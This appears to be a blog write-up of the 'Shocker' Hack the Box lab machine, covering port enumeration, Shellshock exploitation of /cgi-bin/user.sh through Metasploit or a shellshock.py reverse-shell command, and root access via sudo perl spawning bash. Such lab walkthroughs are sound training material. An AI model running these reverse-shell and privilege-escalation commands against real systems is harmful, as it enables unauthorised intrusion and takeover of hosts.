---
layout: post
status: publish
published: true
permalink: shocker
title: 'Shocker box on Hack the Box Write up'
author: Jean-Michel Frouin
author_login: jmfrouin
author_email: jm@frouin.me
author_url: http://frouin.me
date: '2020-04-10 09:45:49 +0100'
date_gmt: '2013-04-10 08:45:49 +0100'
categories:
- htb
- pentest
- unix
comments: []
---
# General infos

- OS: 	Linux
- Difficulty: 	Easy
- Points: 	20
- Release: 	30 Sep 2017
- IP: 	10.10.10.56

![MindMap](Shocker.png "Shocker")

## Enumeration

### Ports

- 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
- 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

### Web

- Dir found: / - 200
- Dir found: /cgi-bin/ - 403
- Dir found: /icons/ - 403
- File found: /cgi-bin/user.sh - 200
- Dir found: /icons/small/ - 403

## Exploitation

### Using MetaSploit

- multi/http/apache_mod_cgi_bash_env_exec
- TARGETURI : /cgi-bin/user.sh

### Manual exploitation 

```
./shellshock.py payload=reverse rhost=10.10.10.56
lhost=10.10.14.36 lport=4444 pages=/cgi-bin/user.sh
```

## User Flag

```
cat /home/shell/user.txt
```

## Priv Esc

```
sudo /usr/bin/perl -e 'system("/bin/bash")'
```

## Root Flag

 
```
cat /root/root.txt
```
<!-- Matomo -->
<script type="text/javascript">
  var _paq = window._paq || [];
  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//stats.frouin.me/";
    _paq.push(['setTrackerUrl', u+'matomo.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<!-- End Matomo Code -->
